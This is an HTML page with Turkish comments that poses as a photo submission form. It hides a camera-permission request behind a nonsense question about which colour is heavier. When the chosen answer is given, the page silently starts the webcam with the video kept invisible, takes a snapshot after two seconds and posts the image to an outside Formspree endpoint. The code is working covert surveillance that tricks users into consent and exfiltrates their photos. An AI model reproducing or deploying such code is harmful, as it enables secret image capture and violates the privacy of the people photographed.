<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera Access and Photo Submission</title>
  <style>
    #videoElement {
      display: none;
    }
  </style>
</head>
<body>

  <h1>Photo Submission Form</h1>

  <form id="photoForm">
    <!-- Karmaşık bir soru gibi görünen izin sorusu -->
    <label for="permission">Hangi renk daha ağırdır, mavi mi kırmızı mı? <br>(Kameraya erişim izni)</label><br>
    <input type="radio" name="permission" value="yes"> Kırmızı <br>
    <input type="radio" name="permission" value="no"> Mavi <br><br>

    <button type="button" id="submitBtn">Devam Et</button>
  </form>

  <video id="videoElement" autoplay></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvas');
    const submitBtn = document.getElementById('submitBtn');
    
    submitBtn.addEventListener('click', function() {
      const selectedPermission = document.querySelector('input[name="permission"]:checked');

      // Kullanıcı doğru seçenek seçti mi?
      if (selectedPermission && selectedPermission.value === "yes") {
        // Kamera izni verildi, kamerayı başlat
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(function(stream) {
            video.srcObject = stream;
            video.style.display = 'none'; // Kamera görünmesin
          })
          .catch(function(err) {
            alert('Kamera erişimi reddedildi: ' + err);
          });

        // Fotoğrafı çekip Formspree ile gönder
        setTimeout(function() {
          const context = canvas.getContext('2d');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Fotoğrafı veri URL'si olarak al
          const imageData = canvas.toDataURL('image/png');

          // Formspree API'sine gönder
          fetch("https://formspree.io/f/mdknqlee", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              _subject: "Photo from Camera",
              photo: imageData
            })
          })
          .then(response => response.json())
          .then(data => {
            alert('Fotoğraf başarıyla gönderildi!');
          })
          .catch(error => {
            console.error('Error:', error);
          });
        }, 2000);  // Fotoğraf çekmek için küçük bir gecikme
      } else {
        alert('Devam etmek için izin vermelisiniz.');
      }
    });
  </script>

</body>
</html>
